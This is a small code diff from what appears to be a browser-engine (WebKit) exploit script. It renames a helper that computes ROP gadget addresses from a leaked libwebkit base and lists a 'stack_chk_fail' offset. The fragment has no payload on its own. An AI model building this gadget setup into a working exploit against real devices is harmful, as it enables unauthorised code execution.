@@ -24,11 +24,11 @@ var exploit = function() {
 
     print("libwebkit base at: 0x" + webKitBase);
      
-var o2wk = function(o)
+var gadget = function(o)
     {
         return webKitBase.add32(o);
     }
-        gadgets = {"stack_chk_fail": o2wk(0xc8),
+        gadgets = {"stack_chk_fail": gadget(0xc8),
 
     };  
 
